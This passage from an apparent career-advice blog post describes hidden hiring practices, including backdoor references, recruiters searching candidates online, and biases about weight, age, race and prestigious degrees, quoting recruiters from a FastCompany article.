<p><i><span>“This phenomenon is even more prevalent in the last five years or so because of LinkedIn’s growing popularity. Even if you choose not to give anybody there as a reference, backdoor references can reveal the skeletons in your closet. Backdoor references can be especially common when you’re looking for a job in sectors like tech.”</span></i></p>

<h5><span>Cyberstalking</span></h5>
<p><span>Another potentially discriminatory and sometimes illegal practice includes cyberstalking you.&nbsp;</span></p>
<p><i><span>“A lot of recruiters—most that I know—will Google candidates who make it pretty far [in the hiring process], and then use Google image results, and also blog posts, tweets, and open Facebook accounts to judge someone’s character and credibility.” (</span></i><a href="https://www.fastcompany.com/40441093/former-recruiters-reveal-the-industrys-dark-secrets-that-cost-you-job-offers"><i><span>Source</span></i></a><i><span>)</span></i></p>

<h5><span>[Subconscious] Bias</span></h5>
<p><span>Whether it’s subconscious or downright discriminatory, hiring managers usually have a </span><a href="https://www.fastcompany.com/40441093/former-recruiters-reveal-the-industrys-dark-secrets-that-cost-you-job-offers"><span>preconceived picture</span></a><span> of what the perfect candidate looks like, which often is based on stereotypes.</span></p>

<p><b>Bias 1: Being overweight</b></p>
<p><span>Weight bias is still especially prevalent, according to one recruiter, who says being overweight can make people think the person is lazy or lacks motivation.</span></p>

<p><b>Bias 2: “Diversity”</b></p>
<p><span>“Diversity in Silicon Valley’s mind is the picture of Phylicia Rashad,” (the actress who portrayed Clair Huxtable on The Cosby Show), said another recruiter </span><a href="https://www.fastcompany.com/40441093/former-recruiters-reveal-the-industrys-dark-secrets-that-cost-you-job-offers"><span>via the same article</span></a><span>.&nbsp;</span></p>
<p><span>According to the post, she sees African-American women considered more readily for roles as diversity/inclusion chiefs, while white men more often lead the pack to head up sales teams.</span></p>
<p><span>Another recruiter bolsters her experience:&nbsp;</span></p>
<p><i><span>“There’s a penchant to see more diversity, but the definition is narrow,” typically reduced to race and gender; it was common to tout a candidate for being a “visible minority.” “It’s the only way to highlight that for the client on a call,” he explains, since “we can’t put it in our documentation.”</span></i></p>

<p><b>Bias 3: Looking “too young”&nbsp;&nbsp;</b></p>
<p><span>The same recruiter from above said he also sees a lot of ageism in the hiring process.&nbsp;</span></p>
<p><span>For example, there’s kind-of a sweet spot in terms of age for C-level positions, he said.&nbsp;</span></p>
<p><span>“My boss would say things like, ‘Did they have enough gray hair?’—not literally, but are they seasoned enough, do they have enough experience where they could be credible?”&nbsp;</span></p>
<p><span>There were occasions when recruiters would nominate younger, well-qualified candidates for senior leadership roles, Mark recalls, but “I’d say 20% of the time they’re open to meeting with that person.”</span></p>

<p><b>Bias 4: Expensive degrees</b></p>
<p><span>At the beginning of the recruitment process, recruiters are dealing with so many resumes that they use a prestigious degree as a quick way to filter down the candidate pool.&nbsp;</span></p>
<p><span>According to a recruiter from that FastCompany article I mentioned …</span></p></span></section></article></div></div>
